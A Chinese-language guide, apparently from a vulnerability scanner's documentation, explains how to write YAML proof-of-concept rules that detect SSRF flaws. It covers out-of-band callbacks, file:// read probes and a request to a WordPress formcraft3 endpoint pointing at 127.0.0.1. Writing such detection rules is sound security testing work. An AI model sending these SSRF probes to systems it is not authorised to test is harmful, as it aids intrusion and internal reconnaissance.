# SSRF

!> 切记SSRF检测的是能否正确从服务端`发出`请求，要严格与redirect区分。同时尽量去检测有回显的情况，如果确实无回显，那么使用反连平台即可

## 无回显情况

> 这里的无回显指的是访问指定的地址没有`确切的返回结果`或者`报错信息`

无回显的SSRF较为容易进行匹配，在触发请求的地点使用`正确`的反连地址进行验证即可，同时在表达式中对反连平台返回的结果进行匹配。成功匹配就说明成功发送了

```yaml
name: poc-yaml-ssrf-reverse
transport: http
set:
	reverse: newReverse()
	reverseURL: reverse.url
rules:
	r0:
		request:
			cache: true
			method: POST
			path: /xxx
			headers:
				Content-Type: application/json
			body: |
				{"content": "include:\n remote: {{reverseURL}}"}
		expression: response.status == 200 && reverse.wait(5)
```

## 有回显情况

这个与无回显正好相反，访问指定的站点之后可能会出现一些可以进行匹配的特征。这里总结下之前见过的一些情况

### 文件读取类型

```yaml
r0:
	request:
		cache: true
		method: POST
		path: /xxx
		headers:
			Content-Type: application/x-www-form-urlencoded
		body: |
			url=file:///{{filename}}
		follow_redirects: false
	expression: |
		response.status == 500 && response.body.bcontains(b"\"exception\":\"java.io.FileNotFoundException\",")
```

使用协议读取文件时，可以尝试去读取系统中存在的文件或者不存在的文件，依据response的内容与状态写出对应的匹配表达式即可

### 访问外部站点类型(不是很推荐)

```yaml
r0:
	request:
		cache: true
		method: GET
		path: /xxx/http/example.com
		follow_redirects: true
	expression: response.status == 200 && response.body.bcontains(b"<title>Example Domain</title>") && response.body.bcontains(b"<h1>Example Domain</h1>")
```

!> 当访问外部站点时，一定需要注意的是能够访问的只是`公共站点`，一定不要请求一些私有项目的公开页面或者文件

这个时候我们只要尝试去匹配返回结果中关于请求站点的相关内容即可。但是注意除了被访问页面的内容之外，我们一定要去匹配一些和被访问站点不同的内容，比如说状态码以及其他存在漏洞的站点中存在的内容

> 但是这种方式是非常不推荐的，一方面是有目标不出网的可能性，另一方面当匹配内容与目标站点区分度不大时会有误报的风险

### 访问内部站点类型

```yaml
r0:
	request:
		cache: true
		method: GET
		path: /wp-admin/admin-ajax.php?action=formcraft3_get&URL=http://127.0.0.1:0
		follow_redirects: false
	expression: |
		response.status == 200 && response.body.bcontains(b"cURL error 3: ") && response.body.bcontains(b"failed")
```

这个例子说明了通过访问本地地址来验证SSRF漏洞的存在。一般这种情况下

- 尝试访问开放的端口，判断对应端口里返回的信息进行判断
    - 不推荐，开放的端口可能过于随机，且匹配的内容过于不固定
- 尝试访问一般情况下一定不开放或者不存在的端口，判断返回的报错信息进行判断
    - 较为推荐的写法

## 模板

[SSRF](/guide/yaml/yaml_poc_template?id=ssrfurl跳转类)
